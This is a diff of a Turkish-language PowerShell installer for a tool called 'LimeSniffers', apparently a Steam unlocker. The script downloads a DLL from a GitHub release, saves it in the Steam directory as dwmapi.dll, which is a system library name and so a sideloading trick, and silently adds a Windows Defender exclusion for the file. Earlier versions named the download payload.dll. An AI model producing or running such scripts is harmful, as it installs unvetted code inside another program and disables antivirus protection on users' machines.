@@ -1,6 +1,4 @@
 # LimeSniffers - Professional Installation Script
-# Based on SteamTools Infrastructure
-
 $ErrorActionPreference = "Stop"
 [Console]::InputEncoding = [System.Text.Encoding]::UTF8
 
@@ -35,7 +33,7 @@ function CheckAndPromptProcess($processName, $message) {
         Write-Host "`r$message" -ForegroundColor Red -NoNewline
         Start-Sleep 1.5
     }
-    Write-Host "" # Yeni satır
+    Write-Host "" 
 }
 
 # --- BAŞLANGIÇ ---
@@ -64,32 +62,23 @@ if (Test-Path $steamRegPath) {
 }
 
 if ([string]::IsNullOrWhiteSpace($steamPath) -or !(Test-Path $steamPath)) {
-    Write-Host "[-] Steam istemcisi bilgisayarınızda bulunamadı. Lütfen kurun ve tekrar deneyin." -ForegroundColor Red
+    Write-Host "[-] Steam istemcisi bulunamadı." -ForegroundColor Red
     Start-Sleep 5
     exit
 }
 
 Write-Host "[+] Steam yolu: $steamPath" -ForegroundColor Green
 
-# 4. Eski/Çakışan DLL'leri Temizle (SteamTools Uyumluluğu)
-$filesToDelete = @("xinput1_4.dll", "user32.dll", "version.dll", "dwmapi.dll")
-foreach ($file in $filesToDelete) {
-    $target = Join-Path $steamPath $file
-    if (Test-Path $target) {
-        Remove-Item $target -Force -ErrorAction SilentlyContinue
-    }
-}
+# 4. DLL İndir
+# Not: DLL ismini senin sistemine göre 'version.dll' veya 'xinput1_4.dll' yapabilirsin. 
+# dwmapi.dll indiriliyor
+$dllPath = Join-Path $steamPath "dwmapi.dll"
+$dllUrl = "https://github.com/PromaxTheCoderx/LimeTools/releases/download/v1/dwmapi.dll"
 
-# 5. LimeSniffers DLL İndir (SteamTools için version.dll veya xinput1_4.dll olarak kaydedilebilir)
-# Biz burada SteamTools standartı olan xinput1_4.dll ismini kullanalım
-$dllPath = Join-Path $steamPath "xinput1_4.dll"
-$dllUrl = "https://github.com/PromaxTheCoderx/LimeTools/releases/download/v1/payload.dll"
 
 try {
     Write-Host "[*] LimeSniffers çekirdeği indiriliyor..." -ForegroundColor Cyan
     Invoke-RestMethod -Uri $dllUrl -OutFile $dllPath -ErrorAction Stop
-    
-    # Windows Defender Dışlama Ekle
     try { Add-MpPreference -ExclusionPath $dllPath -ErrorAction SilentlyContinue } catch {}
 }
 catch {
@@ -98,14 +87,7 @@ catch {
     exit
 }
 
-# 6. Kayıt Defteri Ayarları (SteamTools Aktivasyonu)
-$steamToolsRegPath = 'HKCU:\Software\Valve\Steamtools'
-if (!(Test-Path $steamToolsRegPath)) {
-    New-Item -Path $steamToolsRegPath -Force | Out-Null
-}
-Set-ItemProperty -Path $steamToolsRegPath -Name "iscdkey" -Value "true" -Type String
-
-# 7. Steam'i Yeniden Başlat
+# 5. Steam'i Yeniden Başlat
 Write-Host "[+] Kurulum başarıyla tamamlandı!" -ForegroundColor Green
 Write-Host "[*] Steam başlatılıyor..." -ForegroundColor Gray
 
